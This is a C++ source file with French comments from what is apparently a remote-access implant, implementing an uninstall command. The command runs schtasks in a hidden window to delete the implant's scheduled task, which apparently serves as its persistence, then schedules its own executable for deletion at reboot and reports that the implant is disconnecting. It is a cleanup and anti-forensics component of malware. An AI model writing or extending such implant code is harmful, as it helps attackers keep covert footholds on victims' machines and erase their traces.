#include "cleaner.h"
#include "config.h"
#include <windows.h>
#include <iostream>
#include <string>


std::string cmd_uninstall() {
	std::string result = "";
	char exe_path[MAX_PATH];

	//Récupération du chemin de l'exécutable
	if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
		result = "Erreur lors de la récupération du chemin de l'exécutable.";
		return result;
	}

	//Suppression de la tâche planifiée via schtasks
	std::string task_name = kTaskName;
	std::string command = "C:\\Windows\\System32\\schtasks.exe /Delete /TN \"" + task_name + "\" /F";

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE; // Masquer la fenêtre de la console
	ZeroMemory(&pi, sizeof(pi));

	char cmd[1024];
	strcpy_s(cmd, command.c_str());

	if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		DWORD exit_code = 0;
		GetExitCodeProcess(pi.hProcess, &exit_code);

		if (exit_code == 0) {
			result = "Tâche planifiée supprimée avec succès.";
		}
		else {
			result = "Erreur lors de la suppression de la tâche planifiée. Code de sortie : " + std::to_string(exit_code);
		}
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		result = "Impossible de lancer le schtasks.exe.\n";
	}

	//Planification de la suppression de l'exécutable au prochain redémarrage
	if (MoveFileExA(exe_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
		result += "\nLe programme sera supprimé au prochain redémarrage.";
	}
	else {
		result += "Impossible de planifier la suppression de l'executable (code: " + std::to_string(GetLastError()) + ").\n";
	}

	result += "\nDeconnexion imminente de l'implant...\n";

	return result;
}